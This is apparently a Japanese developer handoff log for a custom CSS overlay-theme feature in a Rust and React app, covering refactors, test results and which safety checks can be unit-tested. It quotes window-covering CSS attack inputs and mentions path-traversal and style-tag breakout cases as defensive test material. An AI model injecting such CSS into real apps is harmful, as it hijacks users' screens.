- `NameForm` の `| null` を型から除去（`setForm(null)` はどこからも呼ばれておらず、
  `form !== null` の恒真ガードが 6 か所残って**状態機械が実際より複雑に読めていた**）。
- `textarea` に `disabled={busy}`／`nextPastedName` に終了条件／`clampUnmatched` に `\p{Cf}`
  （`displayFileName` と揃える）／Rust の契約テストを `exposes_exactly_six_single_purpose_commands` へ改名。
- §9 テストの判定を「葉要素だけ集める」から **「body を複製して入力欄を取り除いて全テキストを見る」**へ
  （旧判定は子要素を持つ容器の直下テキストを見落とす）。
- ⚠ **プレビューは「選択中」のテーマだけを映す**（＝貼った直後のものを試すには一度選択＝配信へ反映が要る）。
  枠を「本番の見本」として一意に保つための意図なので**現状維持**とし、意図・理由・再修正トリガーをコメント化。
- ⚠ `OverlayThemeCard.tsx` の 800 行超は**現状維持**（テストがコンポーネント境界で書かれているため）。
  分割の境界と「060c の同意ダイアログを足して 1000 行を超えたら」というトリガーをコメント化。

**060c への追加申し送り（重要）**:

⚠⚠ **060b 期の「テキスト版コマンドは未実装。060c は 10 行のコマンドを足すだけ」は無効になった。**
060e が `import_overlay_theme_text`（`origin=Local` 固定）を実装済みで、**060c が要るのは `Snapshot` 経路**
なので `import_pasted_text` は再利用できず、**2 本目の `css: String` コマンド**になる
＝ 契約テストが**設計どおり落ちる**。⚠ **数字だけ 2 へ書き換えて通さないこと**
（落ちること自体が §3 の再評価と security-review を呼ぶ仕掛け）。

**テストが無い領域（明示）**: ①実ブラウザでのレイアウト（`contain: paint` の実効性・jsdom はレイアウトを持たない）
②実フォント（`@font-face` 名前空間汚染の実害）③巨大貼り付けの体感 ④窓間の `storage` 伝播
⑤`innerHTML` / `insertRule` / `adoptedStyleSheets` の不在（原理的に静的ガードのみ）。
①②⑤は**テストでは守れない**ので (10-i) / (10-j) と実機確認が唯一の受け皿である。

### 検証（security-review② 対応後）

`typecheck` ✅ ／ `lint` ✅ ／ `test` ✅ **1029 passed / 43 files**（cssScope 71→84 ／ OverlayThemeCard 49→52。
＋CSS guard OK ／ Version sync OK）／ `cargo test overlay_theme` ✅ **82 passed** ／ `cargo check` ✅。

### ⚠⚠ 実機確認リストの棚卸し（2026-08-05）—— **機械で見られる分をテストへ落とし、手動を絞った**

060d（13 項目）／060e（10 項目）を「**ユニットテストで見られるか**」で仕分けた。
⚠ **判断基準は「jsdom / Rust のテストで観測できる事実か」**であって、重要度ではない。
レイアウト・実フォント・実 webview・OS ダイアログ・実ネットワークは**原理的にテストで見られない**ので手動に残す。

**テストへ落としたもの（+28 件 → 1029 → 1057 passed / 44 files）**:

| 追加 | 何を仕様として固定したか | 対応する実機確認 |
|---|---|---|
| **`overlayThemeApi.test.ts`（新規 22 件）** | ⚠⚠ **数え方の非対称**（名前＝コードポイント／本文＝ UTF-8 バイト長）。**絵文字 80 個の名前は通る**（`name.length` で数える退行を殺す）／**256KB ちょうどは通り 1 バイト超で止まる**（境界の内側が未検証だった）／**C1 制御文字（U+0080..U+009F）も拒否**（`/[\x00-\x1F\x7F]/` では漏れる）／⚠ **`origin` も `path` も渡さない**（出自を騙れない・保存先を frontend が決めない）／reject を握り潰さない | 060e-5 の境界側 |
| `OverlayThemeCard.test.tsx` +5 | ⚠⚠ **実サンプル（意匠が外部 `@import` の中）で「書体しか効かない」理由の 4 本が同時に出る**（除去件数／うち少なくとも N 件は外部 CSS／変換したルール数／それでも当たらないことがある）＋ URL 自体は出さない。**プレビューに窓を覆う攻撃形（`position:fixed;inset:0;z-index:2147483647` / `*` / `html,body` / `:has()`）を入れても、注入される CSS のセレクタが全部 `.sd-preview` 配下に閉じる** | 060d-1／10-(b) の**①どの要素に当たるか** |
| `OverlayApp.test.tsx` +1 | ⚠⚠ **`display:none` のテーマでも、既定へ戻せば `<style>` が外れて復帰する**（配信中に詰まない唯一の経路の機構） | 060d-8 |

**⚠ テストへ落とせない（手動に残す）もの**と、その理由:

- **描画位置**（`contain: paint` が効くか）… jsdom はレイアウトを計算しない。**(10-j) は宣言の存在しか見ない。**
- **実フォント**（`@font-face` の名前空間汚染が UI 文字を変えるか）… jsdom はフォントを持たない。
- **実 webview**（`</style>` を含む CSS を `innerHTML` に入れたときの破壊）… jsdom は RAWTEXT 解析を実装していないので**退行を再現できない**（守っているのは静的ガード (10-i) だけ）。
- **OS ダイアログ**（`plugin-dialog` の `open()`）と**実ファイルシステム**（`app_data_dir` の実パス）。
- **実ネットワーク**（`lsof` で ESTABLISHED が増えないこと／SVG data URI の fetch 可否）。
- **窓間の実伝播**（`storage` イベントは jsdom で撃てるが、**別 webview 間で本当に飛ぶか**はプラットフォーム依存）。
- **体感**（256KB を貼ったときの入力の引っかかり）。

⚠ したがって **060b-2 / 3 / 4 / 6 / 7 は Rust のユニットテストが実質を担保済み**
（`importing_writes_exactly_one_uuid_named_file_and_registers_it` / `a_traversal_shaped_name_never_escapes_the_managed_directory` /
`deleting_removes_both_the_row_and_the_file_and_repeats_safely` / `source_paths_must_be_existing_css_files_within_the_size_limit` /
`binary_files_named_css_are_refused` / `a_refused_css_leaves_no_file_and_no_row_behind`）であり、
**手動で見る意味が残るのは「実 OS のパス解決」と「実ダイアログが返すパスを Rust が受けるか」だけ**である。
